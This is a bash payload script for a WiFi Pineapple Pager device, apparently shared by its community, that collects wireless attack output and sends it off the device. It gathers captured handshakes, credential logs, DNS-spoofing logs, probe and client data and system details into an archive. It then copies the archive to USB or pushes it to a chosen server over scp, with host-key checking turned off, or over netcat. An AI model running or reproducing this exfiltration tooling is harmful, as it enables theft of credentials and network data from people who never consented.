#!/bin/bash
# Title: Data Exfiltration Logger
# Description: Comprehensive logging and exfiltration of captured WiFi data
# Author: WiFi Pineapple Pager Community
# Version: 1.0
# Category: Exfiltration
# Net Mode: NAT
#
# LED State Descriptions
# Cyan Blink - Collecting data
# Amber Blink - Preparing exfiltration
# Green Solid - Exfiltration complete
# Red Blink - Error occurred

# Configuration
DATA_DIR="/tmp/exfil_data"
ARCHIVE_FILE="/tmp/exfil_$(date +%Y%m%d_%H%M%S).tar.gz"
EXFIL_METHOD="usb"  # usb, network, or local

LOG "Starting Data Exfiltration Logger"
mkdir -p "$DATA_DIR"

# Collect various data sources
spinner_id=$(START_SPINNER "Collecting data...")

LOG "Gathering WiFi scan data..."
# Capture current WiFi landscape
airodump-ng wlan0mon -w "$DATA_DIR/wifi_scan" --output-format csv > /dev/null 2>&1 &
scan_pid=$!
sleep 30
kill $scan_pid 2>/dev/null

LOG "Collecting handshakes..."
# Copy any handshakes
if [ -d /tmp/handshakes ]; then
    cp -r /tmp/handshakes "$DATA_DIR/" 2>/dev/null
fi

LOG "Gathering credential logs..."
# Copy credential logs
for log in /tmp/captured_credentials.log /tmp/evil_creds.txt /tmp/dns_spoof.log; do
    if [ -f "$log" ]; then
        cp "$log" "$DATA_DIR/" 2>/dev/null
    fi
done

LOG "Collecting probe data..."
# Copy probe databases
for db in /tmp/ssid_probes.log /tmp/probe_database.txt; do
    if [ -f "$db" ]; then
        cp "$db" "$DATA_DIR/" 2>/dev/null
    fi
done

LOG "Gathering network maps..."
# Copy network maps
for map in /tmp/network_map.txt /tmp/network_map.json; do
    if [ -f "$map" ]; then
        cp "$map" "$DATA_DIR/" 2>/dev/null
    fi
done

LOG "Collecting client profiles..."
# Copy client profiles
if [ -f /tmp/client_profiles.log ]; then
    cp /tmp/client_profiles.log "$DATA_DIR/" 2>/dev/null
fi

LOG "Gathering system information..."
# Collect system info
cat > "$DATA_DIR/system_info.txt" <<EOF
=== System Information ===
Date: $(date)
Hostname: $(hostname)
Kernel: $(uname -r)
Uptime: $(uptime)

=== Network Interfaces ===
$(ifconfig)

=== Wireless Info ===
$(iwconfig 2>/dev/null)

=== Process List ===
$(ps aux | grep -E "airodump|aireplay|hostapd|dnsmasq")
EOF

LOG "Collecting wireless statistics..."
# Wireless stats
iw dev wlan0 station dump > "$DATA_DIR/wireless_stats.txt" 2>/dev/null

STOP_SPINNER $spinner_id

# Create archive
spinner_id=$(START_SPINNER "Creating archive...")

LOG "Compressing data..."
cd /tmp
tar -czf "$ARCHIVE_FILE" exfil_data/ 2>/dev/null

archive_size=$(du -h "$ARCHIVE_FILE" | cut -f1)
LOG "Archive created: $ARCHIVE_FILE ($archive_size)"

STOP_SPINNER $spinner_id

# Exfiltration method selection
PROMPT "Exfil method: UP=USB DOWN=Network LEFT=Keep Local"
WAIT_FOR_BUTTON_PRESS UP DOWN LEFT
exfil_choice=$?

case $exfil_choice in
    0)  # USB
        LOG "Exfiltrating to USB..."
        spinner_id=$(START_SPINNER "Copying to USB...")
        
        # Find USB mount
        usb_mount=$(mount | grep -o "/media/.*" | head -1)
        if [ -z "$usb_mount" ]; then
            usb_mount="/mnt/usb"
            mkdir -p "$usb_mount"
            # Try to mount USB
            mount /dev/sda1 "$usb_mount" 2>/dev/null || mount /dev/sdb1 "$usb_mount" 2>/dev/null
        fi
        
        if [ -d "$usb_mount" ]; then
            cp "$ARCHIVE_FILE" "$usb_mount/" 2>/dev/null
            if [ $? -eq 0 ]; then
                LOG "Copied to USB: $usb_mount"
                ALERT "Exfil to USB complete"
            else
                ERROR_DIALOG "USB copy failed"
            fi
        else
            ERROR_DIALOG "No USB device found"
        fi
        
        STOP_SPINNER $spinner_id
        ;;
    
    1)  # Network
        LOG "Network exfiltration selected"
        
        # Get server details
        server_ip=$(IP_PICKER "Server IP?" "192.168.1.100")
        case $? in
            $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                LOG "Network exfil cancelled"
                ;;
            *)
                spinner_id=$(START_SPINNER "Uploading...")
                
                # Try SCP first
                # WARNING: StrictHostKeyChecking=no disables host verification - use only in controlled environments
                scp -o StrictHostKeyChecking=no "$ARCHIVE_FILE" "root@$server_ip:/tmp/" 2>/dev/null
                if [ $? -eq 0 ]; then
                    LOG "Uploaded via SCP (WARNING: Host key verification disabled)"
                    ALERT "Network exfil complete"
                else
                    # Try netcat
                    nc -w 5 "$server_ip" 9999 < "$ARCHIVE_FILE" 2>/dev/null
                    if [ $? -eq 0 ]; then
                        LOG "Uploaded via netcat"
                        ALERT "Network exfil complete"
                    else
                        ERROR_DIALOG "Network upload failed"
                    fi
                fi
                
                STOP_SPINNER $spinner_id
                ;;
        esac
        ;;
    
    2)  # Keep local
        LOG "Data kept local at: $ARCHIVE_FILE"
        ALERT "Data saved locally"
        ;;
esac

# Cleanup option
resp=$(CONFIRMATION_DIALOG "Delete collected data?")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        ;;
    *)
        case "$resp" in
            $DUCKYSCRIPT_USER_CONFIRMED)
                LOG "Cleaning up..."
                rm -rf "$DATA_DIR"
                LOG "Cleanup complete"
                ;;
        esac
        ;;
esac

LOG "Data exfiltration logger finished"
LOG "Archive: $ARCHIVE_FILE ($archive_size)"
